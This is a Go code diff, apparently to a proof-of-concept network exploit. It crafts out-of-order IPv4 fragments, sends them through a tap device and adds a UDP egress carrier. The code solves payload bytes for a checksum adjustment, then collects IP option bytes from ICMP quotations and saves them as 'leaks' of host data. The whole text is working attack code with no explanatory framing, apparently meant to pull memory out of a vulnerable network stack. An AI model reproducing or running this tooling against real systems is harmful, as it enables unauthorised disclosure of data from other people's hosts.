@@ -65,6 +65,8 @@ type cfg struct {
 	gateway    string
 	dstMAC     string
 	egressWait time.Duration
+	transport  string
+	udpPort    int
 }
 
 func parseCfg() cfg {
@@ -84,6 +86,8 @@ func parseCfg() cfg {
 	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
 	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
 	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
+	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp or raw253")
+	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
 	flag.Parse()
 	c.tebarFill = byte(*fill)
@@ -111,6 +115,18 @@ func parseCfg() cfg {
 	}
 	if c.egressWait <= 0 {
 		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
+		os.Exit(1)
+	}
+	if c.transport != "udp" && c.transport != "raw253" {
+		fmt.Fprintln(os.Stderr, "-egress-transport must be udp or raw253")
+		os.Exit(1)
+	}
+	if c.transport == "udp" && c.head != 8 {
+		fmt.Fprintln(os.Stderr, "UDP egress transport requires -head 8")
+		os.Exit(1)
+	}
+	if c.udpPort < 1 || c.udpPort > 65535 {
+		fmt.Fprintln(os.Stderr, "-udp-port must be in 1..65535")
 		os.Exit(1)
 	}
 	return c
@@ -193,19 +209,27 @@ func verifyWrite(tap *os.File, cap *capture) error {
 
 func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 	payload := make([]byte, c.head+c.rest)
-	for i := 0; i < c.head; i++ {
-		payload[i] = marker
-	}
-	for i := c.head; i < len(payload); i++ {
+	for i := range payload {
 		payload[i] = 0x11
 	}
-	if !testo(payload, ipID) {
+	proto := byte(ipProtoRaw)
+	if c.transport == "udp" {
+		proto = ipProtoUDP
+		egressUDPHeaders(payload, uint16(c.udpPort))
+	} else {
+		for i := 0; i < c.head; i++ {
+			payload[i] = marker
+		}
+	}
+	src := net.ParseIP("10.0.0.2").To4()
+	dst := net.ParseIP("10.99.0.2").To4()
+	if !egressSolve(payload, ipID, src, dst, proto) {
 		return nil, errors.New("solver found no 0x4f00 adjustment")
 	}
 	if verbose {
 		printHead(c)
 	}
-	second := frame(fragment(c.head, false, payload[c.head:]))
+	second := frame(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto))
 	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
 		return nil, err
 	}
@@ -215,7 +239,7 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 			return nil, err
 		}
 	}
-	first := frame(fragment(0, true, payload[:c.head]))
+	first := frame(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto))
 	if err := writeTap(tap, first, true, csumAtIP); err != nil {
 		return nil, err
 	}
@@ -238,6 +262,12 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 		extra := ip[ipLen:ihl]
 		if verbose {
 			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
+			if ip[9] == ipProtoUDP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+8 {
+				udp := ip[ihl : ihl+8]
+				fmt.Printf("  post-mutation udp src=%d dst=%d len=%d checksum=0x%04x\n",
+					binary.BigEndian.Uint16(udp[0:2]), binary.BigEndian.Uint16(udp[2:4]),
+					binary.BigEndian.Uint16(udp[4:6]), binary.BigEndian.Uint16(udp[6:8]))
+			}
 		}
 		host := extra[c.head:]
 		leaks = append(leaks, append([]byte(nil), host...))
